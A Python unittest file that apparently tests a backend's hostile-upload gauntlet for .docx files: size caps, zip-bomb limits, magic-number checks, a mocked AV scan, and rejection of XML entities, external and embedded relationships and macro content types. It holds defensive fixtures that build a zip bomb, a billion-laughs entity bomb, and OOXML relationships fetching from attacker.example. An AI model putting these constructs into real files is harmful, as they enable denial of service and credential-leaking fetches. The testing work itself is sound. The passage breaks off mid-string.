#!/usr/bin/env python3
"""
Executable tests for issue #63: hostile-file upload validation + AV scan +
hardened OOXML parsing.

Exercises the real enforcement code in backend/src/upload_validation.py
against synthetically constructed `.docx`-shaped byte strings (no live AWS,
no external AV binary — follows the same third-party-stubbing convention as
tests/test_download_auth_attack.py and tests/test_review_submission_e2e.py
so the suite runs in CI without extra installs).

Per issue #63 AC: "Unit tests cover each hostile-file class (oversized, zip
bomb, entity bomb, external-relationship, embedded-object, macro template,
MIME mismatch)."

The gauntlet order matches docs/threat-model.md -> Hostile file uploads:
  1. Size cap (request size + decompressed-size / zip-bomb ratio)
  2. MIME / magic-number verification (+ [Content_Types].xml WordprocessingML)
  3. AV scan (in-account ClamAV interface — mocked here)
  4. XML-entity hardening (DTD / external-entity rejection)
  5. External-relationship + embedded-object + macro-template checks

A failed validation raises the module's HostileFileError (mapped to
HTTPException by the caller) and never reaches the pipeline; each rejection
path also writes an audit row via the injected audit-write callable.

Exit codes: 0 = all tests pass, 1 = one or more tests failed.
"""

import io
import struct
import sys
import types
import unittest
import zipfile
from pathlib import Path

REPO_ROOT = Path(__file__).resolve().parents[1]
BACKEND_SRC = REPO_ROOT / "backend" / "src"

if str(BACKEND_SRC) not in sys.path:
    sys.path.insert(0, str(BACKEND_SRC))


def _stub_third_party() -> None:
    """Inject minimal stubs for fastapi if absent (repo convention)."""
    if "fastapi" not in sys.modules:
        fastapi_mod = types.ModuleType("fastapi")

        class HTTPException(Exception):
            def __init__(self, status_code: int, detail: str = "") -> None:
                self.status_code = status_code
                self.detail = detail
                super().__init__(detail)

        class status:  # noqa: N801
            HTTP_400_BAD_REQUEST = 400
            HTTP_422_UNPROCESSABLE_ENTITY = 422
            HTTP_413_REQUEST_ENTITY_TOO_LARGE = 413
            HTTP_503_SERVICE_UNAVAILABLE = 503

        fastapi_mod.HTTPException = HTTPException
        fastapi_mod.status = status
        sys.modules["fastapi"] = fastapi_mod


_stub_third_party()

import upload_validation as uv  # noqa: E402

HTTPException = sys.modules["fastapi"].HTTPException


# ---------------------------------------------------------------------------
# Helpers to build synthetic OOXML .docx-shaped archives
# ---------------------------------------------------------------------------

CONTENT_TYPES_WORDPROCESSINGML = (
    '<?xml version="1.0" encoding="UTF-8" standalone="yes"?>'
    '<Types xmlns="http://schemas.openxmlformats.org/package/2006/content-types">'
    '<Override PartName="/word/document.xml" '
    'ContentType="application/vnd.openxmlformats-officedocument.'
    'wordprocessingml.document.main+xml"/>'
    "</Types>"
)

DOCUMENT_XML_MINIMAL = (
    '<?xml version="1.0" encoding="UTF-8" standalone="yes"?>'
    '<w:document xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main">'
    "<w:body><w:p><w:r><w:t>Hello</w:t></w:r></w:p></w:body>"
    "</w:document>"
)

RELS_XML_BENIGN = (
    '<?xml version="1.0" encoding="UTF-8" standalone="yes"?>'
    '<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">'
    '<Relationship Id="rId1" '
    'Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/officeDocument" '
    'Target="word/document.xml"/>'
    "</Relationships>"
)


def _build_valid_docx() -> bytes:
    """A minimal, well-formed, benign .docx used as the control/happy path."""
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w", zipfile.ZIP_DEFLATED) as zf:
        zf.writestr("[Content_Types].xml", CONTENT_TYPES_WORDPROCESSINGML)
        zf.writestr("_rels/.rels", RELS_XML_BENIGN)
        zf.writestr("word/document.xml", DOCUMENT_XML_MINIMAL)
    return buf.getvalue()


def _build_docx_with_extra_entries(entry_count: int, entry_body: bytes = b"x") -> bytes:
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w", zipfile.ZIP_DEFLATED) as zf:
        zf.writestr("[Content_Types].xml", CONTENT_TYPES_WORDPROCESSINGML)
        zf.writestr("_rels/.rels", RELS_XML_BENIGN)
        zf.writestr("word/document.xml", DOCUMENT_XML_MINIMAL)
        for i in range(entry_count):
            zf.writestr(f"word/junk{i}.bin", entry_body)
    return buf.getvalue()


def _build_zip_bomb_docx() -> bytes:
    """A single entry whose compressed size is tiny relative to its
    uncompressed size — a classic zip-bomb compression-ratio attack."""
    buf = io.BytesIO()
    huge_payload = b"0" * (200 * 1024 * 1024)  # 200MB of a single repeated byte
    with zipfile.ZipFile(buf, "w", zipfile.ZIP_DEFLATED) as zf:
        zf.writestr("[Content_Types].xml", CONTENT_TYPES_WORDPROCESSINGML)
        zf.writestr("_rels/.rels", RELS_XML_BENIGN)
        zf.writestr("word/document.xml", DOCUMENT_XML_MINIMAL)
        zf.writestr("word/bomb.bin", huge_payload)
    return buf.getvalue()


def _build_docx_with_entity_bomb() -> bytes:
    """word/document.xml carries a DOCTYPE with an entity expansion (a
    scaled-down 'billion laughs' pattern) — must be rejected by the
    XML-entity hardening check without ever being expanded."""
    entity_bomb_xml = (
        '<?xml version="1.0"?>'
        "<!DOCTYPE lolz [//nolint\n"
        '  <!ENTITY lol "lol">\n'
        '  <!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">\n'
        '  <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">\n'
        "]>"
        '<w:document xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main">'
        "<w:body><w:p><w:r><w:t>&lol3;</w:t></w:r></w:p></w:body>"
        "</w:document>"
    )
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w", zipfile.ZIP_DEFLATED) as zf:
        zf.writestr("[Content_Types].xml", CONTENT_TYPES_WORDPROCESSINGML)
        zf.writestr("_rels/.rels", RELS_XML_BENIGN)
        zf.writestr("word/document.xml", entity_bomb_xml)
    return buf.getvalue()


def _build_docx_with_external_relationship() -> bytes:
    """word/_rels/document.xml.rels declares a TargetMode="External"
    relationship to a remote URL — must be rejected."""
    external_rels_xml = (
        '<?xml version="1.0" encoding="UTF-8" standalone="yes"?>'
        '<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">'
        '<Relationship Id="rId1" '
        'Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/oleObject" '
        'Target="http://attacker.example/payload.bin" TargetMode="External"/>'
        "</Relationships>"
    )
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w", zipfile.ZIP_DEFLATED) as zf:
        zf.writestr("[Content_Types].xml", CONTENT_TYPES_WORDPROCESSINGML)
        zf.writestr("_rels/.rels", RELS_XML_BENIGN)
        zf.writestr("word/document.xml", DOCUMENT_XML_MINIMAL)
        zf.writestr("word/_rels/document.xml.rels", external_rels_xml)
    return buf.getvalue()


def _build_docx_with_external_hyperlink() -> bytes:
    """word/_rels/document.xml.rels declares a TargetMode="External"
    relationship of type hyperlink — the benign, ubiquitous case. A hyperlink
    is inert until a human clicks it and never fetches at parse/open time, so
    it must be accepted (see docs/threat-model.md)."""
    hyperlink_rels_xml = (
        '<?xml version="1.0" encoding="UTF-8" standalone="yes"?>'
        '<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">'
        '<Relationship Id="rId1" '
        'Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" '
        'Target="https://example.com/location/contact" TargetMode="External"/>'
        "</Relationships>"
    )
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w", zipfile.ZIP_DEFLATED) as zf:
        zf.writestr("[Content_Types].xml", CONTENT_TYPES_WORDPROCESSINGML)
        zf.writestr("_rels/.rels", RELS_XML_BENIGN)
        zf.writestr("word/document.xml", DOCUMENT_XML_MINIMAL)
        zf.writestr("word/_rels/document.xml.rels", hyperlink_rels_xml)
    return buf.getvalue()


def _build_docx_with_external_image() -> bytes:
    """word/_rels/document.xml.rels declares a TargetMode="External"
    relationship of type image — Word fetches this the moment the file is
    opened (SSRF / NTLM-hash leak), so it must stay rejected even though it is
    not a hyperlink."""
    image_rels_xml = (
        '<?xml version="1.0" encoding="UTF-8" standalone="yes"?>'
        '<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">'
        '<Relationship Id="rId1" '
        'Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" '
        'Target="http://attacker.example/beacon.png" TargetMode="External"/>'
        "</Relationships>"
    )
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w", zipfile.ZIP_DEFLATED) as zf:
        zf.writestr("[Content_Types].xml", CONTENT_TYPES_WORDPROCESSINGML)
        zf.writestr("_rels/.rels", RELS_XML_BENIGN)
        zf.writestr("word/document.xml", DOCUMENT_XML_MINIMAL)
        zf.writestr("word/_rels/document.xml.rels", image_rels_xml)
    return buf.getvalue()


def _build_docx_with_embedded_object() -> bytes:
    """A package relationship of type oleObject pointing at an internal
    embedded OLE package — must be rejected."""
    embed_rels_xml = (
        '<?xml version="1.0" encoding="UTF-8" standalone="yes"?>'
        '<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">'
        '<Relationship Id="rId1" '
        'Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/oleObject" '
        'Target="embeddings/oleObject1.bin"/>'
        "</Relationships>"
    )
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w", zipfile.ZIP_DEFLATED) as zf:
        zf.writestr("[Content_Types].xml", CONTENT_TYPES_WORDPROCESSINGML)
        zf.writestr("_rels/.rels", RELS_XML_BENIGN)
        zf.writestr("word/document.xml", DOCUMENT_XML_MINIMAL)
        zf.writestr("word/_rels/document.xml.rels", embed_rels_xml)
        zf.writestr("word/embeddings/oleObject1.bin", b"\xd0\xcf\x11\xe0fake-ole")
    return buf.getvalue()


def _build_macro_enabled_docx() -> bytes:
    """[Content_Types].xml declares the macro-enabled main document content
    type (the .docm main-document type) and a vbaProject.bin part is
    present — must be rejected even though the filename says .docx."""
    macro_content_types = (
        '<?xml version="1.0" encoding="UTF-8" standalone="yes"?>'
        '<Types xmlns="http://schemas.openxmlformats.org/package/2006/content-types">'
        '<Override PartName="/word/document.xml" '
        'ContentType="application/vnd.ms-word.document.macroEnabled.main+xml"/>'
        '<Override PartName="/word/vbaProject.bin" '
        'ContentType="application/vnd.ms-office.vbaProject"/>'
        "</Types>"
    )
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w", zipfile.ZIP_DEFLATED) as zf:
        zf.writestr("[Content_Types].xml", macro_content_types)
        zf.writestr("_rels/.rels", RELS_XML_BENIGN)
        zf.writestr("word/document.xml", DOCUMENT_XML_MINIMAL)
        zf.writestr("word/vbaProject.bin", b"macro-bytes")
    return buf.getvalue()


def _build_mime_mismatch_file() -> bytes:
    """Not a ZIP at all — a renamed PDF-ish payload with a .docx extension
    (MIME/magic-number mismatch)."""
    return b"%PDF-1.4\n%renamed payload pretending to be a .docx\n"


# ---------------------------------------------------------------------------
# attachedTemplate fixtures — the real-world shape this ticket is about: a
# document drafted from a firm/organization Word template carries a
# word/_rels/settings.xml.rels relationship of type .../attachedTemplate
# (usually TargetMode="External", targeting a local file:/// template path
# on the drafter's machine) PLUS a word/settings.xml <w:attachedTemplate
# r:id="..."/> element that references it by Id. Both must be stripped
# together, matched by id, or the archive is left with a dangling r:id.
# ---------------------------------------------------------------------------

SETTINGS_XML_WITH_ATTACHED_TEMPLATE = (
    '<?xml version="1.0" encoding="UTF-8" standalone="yes"?>'
    '<w:settings '
    'xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main" '
    'xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships">'
    '<w:attachedTemplate r:id="rId1"/>'
    '<w:zoom w:percent="100"/>'
    "</w:settings>"
)

SETTINGS_RELS_WITH_ATTACHED_TEMPLATE = (
    '<?xml version="1.0" encoding="UTF-8" standalone="yes"?>'
    '<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">'
    '<Relationship Id="rId1" '
    'Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/attachedTemplate" '
    'Target="file:///C:\\Program%20Files\\Microsoft%20Office\\Templates\\TLTemplates\\TLBlank%20Portrait.dot" '
    'TargetMode="External"/>'
    "</Relationships>"
)

DOCUMENT_RELS_WITH_HYPERLINK = (
    '<?xml version="1.0" encoding="UTF-8" standalone="yes"?>'
    '<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">'
    '<Relationship Id="rId1" '
    'Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" '
    'Target="https://example.box.com/s/share-link" TargetMode="External"/>'
    "</Relationships>"
)

DOCUMENT_RELS_WITH_EMBEDDED_OBJECT = (
    '<?xml version="1.0" encoding="UTF-8" standalone="yes"?>'
    '<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">'
    '<Relationship Id="rId1" '
    'Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/oleObject" '
    'Target="embeddings/oleObject1.bin"/>'
    "</Relationships>"
)


def _build_docx_with_attached_template() -> bytes:
    """The minimal real-world shape: a document drafted from a template
    carries both the .rels relationship and the referencing settings.xml
    element — the ONLY thing wrong with an otherwise clean document."""
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w", zipfile.ZIP_DEFLATED) as zf:
        zf.writestr("[Content_Types].xml", CONTENT_TYPES_WORDPROCESSINGML)
        zf.writestr("_rels/.rels", RELS_XML_BENIGN)
        zf.writestr("word/document.xml", DOCUMENT_XML_MINIMAL)
        zf.writestr("word/settings.xml", SETTINGS_XML_WITH_ATTACHED_TEMPLATE)
        zf.writestr("word/_rels/settings.xml.rels", SETTINGS_RELS_WITH_ATTACHED_TEMPLATE)
    return buf.getvalue()


def _build_docx_with_attached_template_and_hyperlink() -> bytes:
    """Mirrors the actual repro document: an attachedTemplate relationship
    (must be sanitized) coexisting with a legitimate external hyperlink
    (must still be accepted, unmodified)."""
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w", zipfile.ZIP_DEFLATED) as zf:
        zf.writestr("[Content_Types].xml", CONTENT_TYPES_WORDPROCESSINGML)
        zf.writestr("_rels/.rels", RELS_XML_BENIGN)
        zf.writestr("word/document.xml", DOCUMENT_XML_MINIMAL)
        zf.writestr("word/_rels/document.xml.rels", DOCUMENT_RELS_WITH_HYPERLINK)
        zf.writestr("word/settings.xml", SETTINGS_XML_WITH_ATTACHED_TEMPLATE)
        zf.writestr("word/_rels/settings.xml.rels", SETTINGS_RELS_WITH_ATTACHED_TEMPLATE)
    return buf.getvalue()


def _build_docx_with_attached_template_and_embedded_object() -> bytes:
    """An attachedTemplate relationship (sanitized away) coexisting with an
    embedded OLE object (must still be rejected) -- proves sanitizing the
    template reference does not widen the gate for anything else."""
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w", zipfile.ZIP_DEFLATED) as zf:
        zf.writestr("[Content_Types].xml", CONTENT_TYPES_WORDPROCESSINGML)
        zf.writestr("_rels/.rels", RELS_XML_BENIGN)
        zf.writestr("word/document.xml", DOCUMENT_XML_MINIMAL)
        zf.writestr("word/_rels/document.xml.rels", DOCUMENT_RELS_WITH_EMBEDDED_OBJECT)
        zf.writestr("word/embeddings/oleObject1.bin", b"\xd0\xcf\x11\xe0fake-ole")
        zf.writestr("word/settings.xml", SETTINGS_XML_WITH_ATTACHED_TEMPLATE)
        zf.writestr("word/_rels/settings.xml.rels", SETTINGS_RELS_WITH_ATTACHED_TEMPLATE)
    return buf.getvalue()


def _build_docx_with_multiple_attached_template_relationships() -> bytes:
    """Two attachedTemplate Relationship entries in the same .rels part
    (rId1, rId2) but only ONE referencing w:attachedTemplate element (for
    rId1) in settings.xml -- covers both "multiple rels" and "a rel with no
    matching element" (rId2) in one fixture."""
    settings_rels_xml = (
        '<?xml version="1.0" encoding="UTF-8" standalone="yes"?>'
        '<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">'
        '<Relationship Id="rId1" '
        'Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/attachedTemplate" '
        'Target="file:///C:/Templates/Normal.dotm" TargetMode="External"/>'
        '<Relationship Id="rId2" '
        'Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/attachedTemplate" '
        'Target="file:///C:/Templates/Orphan.dotm" TargetMode="External"/>'
        "</Relationships>"
    )
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w", zipfile.ZIP_DEFLATED) as zf:
        zf.writestr("[Content_Types].xml", CONTENT_TYPES_WORDPROCESSINGML)
        zf.writestr("_rels/.rels", RELS_XML_BENIGN)
        zf.writestr("word/document.xml", DOCUMENT_XML_MINIMAL)
        zf.writestr("word/settings.xml", SETTINGS_XML_WITH_ATTACHED_TEMPLATE)
        zf.writestr("word/_rels/settings.xml.rels", settings_rels_xml)
    return buf.getvalue()


def _build_docx_with_attached_template_rel_but_no_settings_element() -> bytes:
    """The .rels relationship exists (orphaned) but word/settings.xml has NO
    w:attachedTemplate element referencing it at all -- "a rel present with
    no matching element". The relationship must still be stripped; nothing
    should crash trying to find a nonexistent element."""
    settings_xml_no_element = (
        '<?xml version="1.0" encoding="UTF-8" standalone="yes"?>'
        '<w:settings xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main">'
        '<w:zoom w:percent="100"/>'
        "</w:settings>"
    )
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w", zipfile.ZIP_DEFLATED) as zf:
        zf.writestr("[Content_Types].xml", CONTENT_TYPES_WORDPROCESSINGML)
        zf.writestr("_rels/.rels", RELS_XML_BENIGN)
        zf.writestr("word/document.xml", DOCUMENT_XML_MINIMAL)
        zf.writestr("word/settings.xml", settings_xml_no_element)
        zf.writestr("word/_rels/settings.xml.rels", SETTINGS_RELS_WITH_ATTACHED_TEMPLATE)
    return buf.getvalue()


def _build_docx_with_dangling_attached_template_element_only() -> bytes:
    """word/settings.xml has a w:attachedTemplate element referencing an Id
    that has NO corresponding Relationship anywhere (already-dangling,
    pre-existing document defect, not something this gauntlet introduced)
    -- "element present with no matching rel". There is no attachedTemplate
    RELATIONSHIP anywhere in the archive, so sanitization has nothing to
    trigger on and must be a complete no-op (original bytes, unchanged)."""
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w", zipfile.ZIP_DEFLATED) as zf:
        zf.writestr("[Content_Types].xml", CONTENT_TYPES_WORDPROCESSINGML)
        zf.writestr("_rels/.rels", RELS_XML_BENIGN)
        zf.writestr("word/document.xml", DOCUMENT_XML_MINIMAL)
        # references "rId99", which does not exist in any .rels part below.
        zf.writestr("word/settings.xml", SETTINGS_XML_WITH_ATTACHED_TEMPLATE)
    return buf.getvalue()


def _build_docx_with_bad_content_types() -> bytes:
    """A real, well-formed ZIP/OOXML container but [Content_Types].xml does
    NOT declare a WordprocessingML main document (e.g. a spreadsheet) —
    magic number says ZIP, but the declared part types are wrong."""
    spreadsheet_content_types = (
        '<?xml version="1.0" encoding="UTF-8" standalone="yes"?>'
        '<Types xmlns="http://schemas.openxmlformats.org/package/2006/content-types">'
        '<Override PartName="/xl/workbook.xml" '
        'ContentType="application/vnd.openxmlformats-officedocument.'
        'spreadsheetml.sheet.main+xml"/>'
        "</Types>"
    )
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w", zipfile.ZIP_DEFLATED) as zf:
        zf.writestr("[Content_Types].xml", spreadsheet_content_types)
        zf.writestr("_rels/.rels", RELS_XML_BENIGN)
        zf.writestr("xl/workbook.xml", "<workbook/>")
    return buf.getvalue()


class _FakeAuditSink:
    """Records audit rows written by the gauntlet (issue #63 AC: "A failed
    validation ... writes an audit row")."""

    def __init__(self) -> None:
        self.rows: list[dict] = []

    def __call__(self, **kwargs) -> None:
        self.rows.append(kwargs)


class _FakeAvClient:
    """Injected AV-scan client. `verdict` controls CLEAN/INFECTED; records
    that it was called with the raw bytes before any structural read."""

    def __init__(self, verdict: str = "CLEAN") -> None:
        self.verdict = verdict
        self.scanned_payloads: list[bytes] = []

    def scan(self, file_bytes: bytes) -> str:
        self.scanned_payloads.append(file_bytes)
        return self.verdict


# ---------------------------------------------------------------------------
# 1. Oversized document
# ---------------------------------------------------------------------------


class TestOversizedRequest(unittest.TestCase):
    def test_oversized_upload_rejected_before_any_parsing(self) -> None:
        oversized = b"PK\x03\x04" + b"0" * (uv.MAX_UPLOAD_SIZE_BYTES + 1)
        av = _FakeAvClient()
        audit = _FakeAuditSink()
        with self.assertRaises(uv.HostileFileError) as ctx:
            uv.run_upload_gauntlet(
                oversized,
                filename="big.docx",
                declared_content_type="application/vnd.openxmlformats-officedocument.wordprocessingml.document",
                av_client=av,
                audit_write=audit,
                review_id="rev-1",
            )
        self.assertEqual(ctx.exception.reason_code, "file_too_large")
        self.assertEqual(len(av.scanned_payloads), 0, "AV scan must not run on an oversized file")
        self.assertEqual(len(audit.rows), 1)
        self.assertEqual(audit.rows[0]["reason_code"], "file_too_large")


# ---------------------------------------------------------------------------
# 2. Zip bomb (entry count + compression ratio / decompressed-size cap)
# ---------------------------------------------------------------------------


class TestZipBomb(unittest.TestCase):
    def test_excess_entry_count_rejected(self) -> None:
        payload = _build_docx_with_extra_entries(uv.MAX_ZIP_ENTRY_COUNT + 10)
        av = _FakeAvClient()
        audit = _FakeAuditSink()
        with self.assertRaises(uv.HostileFileError) as ctx:
            uv.run_upload_gauntlet(
                payload,
                filename="many-entries.docx",
                declared_content_type="application/vnd.openxmlformats-officedocument.wordprocessingml.document",
                av_client=av,
                audit_write=audit,
                review_id="rev-2",
            )
        self.assertEqual(ctx.exception.reason_code, "zip_bomb_entry_count")
        self.assertEqual(audit.rows[0]["reason_code"], "zip_bomb_entry_count")

    def test_compression_ratio_bomb_rejected(self) -> None:
        payload = _build_zip_bomb_docx()
        # sanity: the compressed payload on disk must be far smaller than
        # the uncompressed content it claims to hold, or the test proves
        # nothing about ratio detection.
        self.assertLess(len(payload), 5 * 1024 * 1024)
        av = _FakeAvClient()
        audit = _FakeAuditSink()
        with self.assertRaises(uv.HostileFileError) as ctx:
            uv.run_upload_gauntlet(
                payload,
                filename="bomb.docx",
                declared_content_type="application/vnd.openxmlformats-officedocument.wordprocessingml.document",
                av_client=av,
                audit_write=audit,
                review_id="rev-3",
            )
        self.assertIn(
            ctx.exception.reason_code,
            {"zip_bomb_ratio", "zip_bomb_uncompressed_size"},
        )
        self.assertEqual(len(av.scanned_payloads), 1, "AV scan runs on raw bytes before structural checks")


# ---------------------------------------------------------------------------
# 3. MIME / magic-number mismatch
# ---------------------------------------------------------------------------


class TestMimeMismatch(unittest.TestCase):
    def test_non_zip_payload_rejected(self) -> None:
        payload = _build_mime_mismatch_file()
        av = _FakeAvClient()
        audit = _FakeAuditSink()
        with self.assertRaises(uv.HostileFileError) as ctx:
            uv.run_upload_gauntlet(
                payload,
                filename="fake.docx",
                declared_content_type="application/vnd.openxmlformats-officedocument.wordprocessingml.document",
                av_client=av,
                audit_write=audit,
                review_id="rev-4",
            )
        self.assertEqual(ctx.exception.reason_code, "mime_magic_number_mismatch")

    def test_non_wordprocessingml_content_types_rejected(self) -> None:
        payload = _build_docx_with_bad_content_types()
        av = _FakeAvClient()
        audit = _FakeAuditSink()
        with self.assertRaises(uv.HostileFileError) as ctx:
            uv.run_upload_gauntlet(
                payload,
                filename="fake-spreadsheet.docx",
                declared_content_type="application/vnd.openxmlformats-officedocument.wordprocessingml.document",
                av_client=av,
                audit_write=audit,
                review_id="rev-5",
            )
        self.assertEqual(ctx.exception.reason_code, "mime_magic_number_mismatch")


# ---------------------------------------------------------------------------
# 4. AV scan fails closed
# ---------------------------------------------------------------------------


class TestAvScan(unittest.TestCase):
    def test_infected_file_fails_closed_and_never_reaches_parser(self) -> None:
        payload = _build_valid_docx()
        av = _FakeAvClient(verdict="INFECTED")
        audit = _FakeAuditSink()
        with self.assertRaises(uv.HostileFileError) as ctx:
            uv.run_upload_gauntlet(
                payload,
                filename="infected.docx",
                declared_content_type="application/vnd.openxmlformats-officedocument.wordprocessingml.document",
                av_client=av,
                audit_write=audit,
                review_id="rev-6",
            )
        self.assertEqual(ctx.exception.reason_code, "av_positive")
        self.assertEqual(len(av.scanned_payloads), 1)
        self.assertEqual(audit.rows[0]["reason_code"], "av_positive")

    def test_av_scan_runs_before_xml_parsing(self) -> None:
        """An entity-bomb file that is ALSO flagged INFECTED must fail on
        av_positive, proving AV runs before the parser ever touches the
        archive's XML structure."""
        payload = _build_docx_with_entity_bomb()
        av = _FakeAvClient(verdict="INFECTED")
        audit = _FakeAuditSink()
        with self.assertRaises(uv.HostileFileError) as ctx:
            uv.run_upload_gauntlet(
                payload,
                filename="infected-and-hostile.docx",
                declared_content_type="application/vnd.openxmlformats-officedocument.wordprocessingml.document",
                av_client=av,
                audit_write=audit,
                review_id="rev-7",
            )
        self.assertEqual(ctx.exception.reason_code, "av_positive")

    def test_av_scan_runs_before_mime_content_types_check(self) -> None:
        """A file with a non-WordprocessingML [Content_Types].xml that is ALSO
        flagged INFECTED must fail on av_positive, not mime_magic_number_mismatch —
        proving AV scans the raw bytes before the MIME check ever decompresses
        [Content_Types].xml. Without this test, reordering the MIME check back
        before the AV scan does not fail any test (caught by review mutation
        testing on PR #169)."""
        payload = _build_docx_with_bad_content_types()
        av = _FakeAvClient(verdict="INFECTED")
        audit = _FakeAuditSink()
        with self.assertRaises(uv.HostileFileError) as ctx:
            uv.run_upload_gauntlet(
                payload,
                filename="infected-spreadsheet.docx",
                declared_content_type="application/vnd.openxmlformats-officedocument.wordprocessingml.document",
                av_client=av,
                audit_write=audit,
                review_id="rev-8",
            )
        self.assertEqual(ctx.exception.reason_code, "av_positive")
        self.assertEqual(len(av.scanned_payloads), 1)


# ---------------------------------------------------------------------------
# 5. XML entity expansion (XXE / billion laughs)
# ---------------------------------------------------------------------------


class TestEntityExpansion(unittest.TestCase):
    def test_entity_bomb_rejected_without_expansion(self) -> None:
        payload = _build_docx_with_entity_bomb()
        av = _FakeAvClient()
        audit = _FakeAuditSink()
        with self.assertRaises(uv.HostileFileError) as ctx:
            uv.run_upload_gauntlet(
                payload,
                filename="entity-bomb.docx",
                declared_content_type="application/vnd.openxmlformats-officedocument.wordprocessingml.document",
                av_client=av,
                audit_write=audit,
                review_id="rev-8",
            )
        self.assertEqual(ctx.exception.reason_code, "xml_entity_rejected")
        self.assertEqual(audit.rows[0]["reason_code"], "xml_entity_rejected")


# ---------------------------------------------------------------------------
# 6. External relationship
# ---------------------------------------------------------------------------


class TestExternalRelationship(unittest.TestCase):
    def test_external_relationship_rejected(self) -> None:
        payload = _build_docx_with_external_relationship()
        av = _FakeAvClient()
        audit = _FakeAuditSink()
        with self.assertRaises(uv.HostileFileError) as ctx:
            uv.run_upload_gauntlet(
                payload,
                filename="external-rel.docx",
                declared_content_type="application/vnd.openxmlformats-officedocument.wordprocessingml.document",
                av_client=av,
                audit_write=audit,
                review_id="rev-9",
            )
        self.assertEqual(ctx.exception.reason_code, "external_relationship")

    def test_external_image_still_rejected(self) -> None:
        """A non-hyperlink external relationship (image) fetches on open and
        must remain rejected — the hyperlink allowance is a narrow allowlist,
        not a blanket relaxation of external targets."""
        payload = _build_docx_with_external_image()
        av = _FakeAvClient()
        audit = _FakeAuditSink()
        with self.assertRaises(uv.HostileFileError) as ctx:
            uv.run_upload_gauntlet(
                payload,
                filename="external-image.docx",
                declared_content_type="application/vnd.openxmlformats-officedocument.wordprocessingml.document",
                av_client=av,
                audit_write=audit,
                review_id="rev-9b",
            )
        self.assertEqual(ctx.exception.reason_code, "external_relationship")

    def test_external_hyperlink_accepted(self) -> None:
        """A plain external hyperlink is the benign, ubiquitous case (any
        contract with a clickable URL). It is inert until clicked and never
        fetches at parse time, so the gauntlet must accept it."""
        payload = _build_docx_with_external_hyperlink()
        av = _FakeAvClient()
        audit = _FakeAuditSink()
        result = uv.run_upload_gauntlet(
            payload,
            filename="hyperlink.docx",
            declared_content_type="application/vnd.openxmlformats-officedocument.wordprocessingml.document",
            av_client=av,
            audit_write=audit,
            review_id="rev-9c",
        )
        self.assertEqual(result, payload)


# ---------------------------------------------------------------------------
# 7. Embedded object
# ---------------------------------------------------------------------------


class TestEmbeddedObject(unittest.TestCase):
    def test_embedded_ole_object_rejected(self) -> None:
        payload = _build_docx_with_embedded_object()
        av = _FakeAvClient()
        audit = _FakeAuditSink()
        with self.assertRaises(uv.HostileFileError) as ctx:
            uv.run_upload_gauntlet(
                payload,
                filename="embedded-object.docx",
                declared_content_type="application/vnd.openxmlformats-officedocument.wordprocessingml.document",
                av_client=av,
                audit_write=audit,
                review_id="rev-10",
            )
        self.assertEqual(ctx.exception.reason_code, "embedded_object")


# ---------------------------------------------------------------------------
# 8. Macro-enabled template
# ---------------------------------------------------------------------------


class TestMacroEnabledTemplate(unittest.TestCase):
    def test_macro_enabled_content_type_rejected(self) -> None:
        payload = _build_macro_enabled_docx()
        av = _FakeAvClient()
        audit = _FakeAuditSink()
        with self.assertRaises(uv.HostileFileError) as ctx:
            uv.run_upload_gauntlet(
                payload,
                filename="macro.docx",
                declared_content_type="application/vnd.openxmlformats-officedocument.wordprocessingml.document",
                av_client=av,
                audit_write=audit,
                review_id="rev-11",
            )
        self.assertEqual(ctx.exception.reason_code, "macro_enabled_template")


# ---------------------------------------------------------------------------
# 8b. attachedTemplate — SANITIZED on ingest, not rejected (owner decision:
# a document drafted from a firm/organization Word template carries this
# relationship, so unconditionally rejecting it refuses most real legal
# documents; see docs/threat-model.md -> Hostile file uploads). Every other
# relationship class above stays a hard rejection.
# ---------------------------------------------------------------------------


SETTINGS_XML_WITH_PAIRED_ATTACHED_TEMPLATE = (
    '<?xml version="1.0" encoding="UTF-8" standalone="yes"?>'
    '<w:settings '
    'xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main" '
    'xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships">'
